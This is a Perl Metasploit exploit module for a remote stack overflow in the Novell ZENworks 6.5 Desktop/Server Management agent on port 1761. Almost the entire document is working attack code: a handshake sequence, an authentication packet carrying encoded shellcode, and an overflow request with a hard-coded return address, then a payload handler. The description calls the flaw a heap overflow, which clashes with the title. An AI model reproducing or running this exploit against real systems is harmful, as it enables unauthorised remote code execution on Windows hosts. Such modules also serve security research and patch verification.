ZENworks 6.5 Desktop/Server Management Remote Stack Overflow
============================================================

#
#

package Msf::Exploit::zenworks_desktop_agent;
use strict;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;  => &#039;ZENworks 6.5 Desktop/Server Management Remote Stack Overflow&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039; =>
	  [
		&#039;Anonymous&#039;,
	  ],
	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039;, &#039;winxp&#039;, &#039;win2k&#039;, &#039;win2003&#039; ],
	&#039;Priv&#039;  => 1,

	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 1761 ],
	  },
	  
	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 0x7FFF,
		&#039;BadChars&#039;  => "\x00",
		&#039;Keys&#039;      => [&#039;+ws2ord&#039;],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
		This module exploits a heap overflow in the Novell ZENworks
        Desktop Management agent.
}),

	&#039;Refs&#039;  =>
	  [
		[&#039;BID&#039;, 13678],
	  ],  
	 
	&#039;Targets&#039; =>
	  [
		[ &#039;Windows XP/2000/2003- ZENworks 6.5 Desktop/Server Agent&#039;, 0x10002e06]
	  ],
	  
	&#039;Keys&#039;  => [&#039;zenworks&#039;],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( &#039;[*] Error creating socket: &#039; . $s->GetError );
		return;
	}

        my $req = "\x00\x06\x05\x01\x10\xe6\x01\x00\x34\x5a\xf4\x77\x80\x95\xf8\x77";
        $self->PrintLine( "[*] Sending version identication" );
	$s->Send($req);

        my $ident = $s->Recv(-1, 16);
        if (length($ident) != 16)
        {
         $self->PrintLine( "[*] Failed to receive agent version identication" );
         return;
        }
        else
        {
         $self->PrintLine( "[*] Received agent version identication" );
        }

        $req = "\x00\x01";
        $self->PrintLine( "[*] Sending client acknowledgment" );
	$s->Send($req);

        # stack overflow in ZenRem32.exe / ZENworks Server Management

	$req = "\x00\x06metmet\x00\x06metmet\x7F\xFF" . $shellcode . "\x00\x01";
        $self->PrintLine( "[*] Sending authentication data (including shellcode)" );
        $s->Send($req);

	$s->Recv(2, 2);
	$s->Send("\x00\x01");
        
        #$s->Recv(2, 2);
        #my $len = $s->Recv(2,2);
        #$len = unpack (&#039;n&#039;, $len);
        #$s->Recv($len, $len);
	
        $s->Send("\x00\x02");

        $self->PrintLine( "[*] Sending final payload" );

        # pop/pop/pop/pop/pop/ret in zencomm.dll on our shellcode
	my $crash = "A" x 0x20;
	$req = "\x00\x24" . $crash . pack(&#039;V&#039;, $target->[1]);
        $s->Send($req);
	    
	$self->PrintLine("[*] Overflow request sent, sleeping for four seconds");
	select(undef, undef, undef, 4);

	$self->Handler($s);
        return;
}

1;


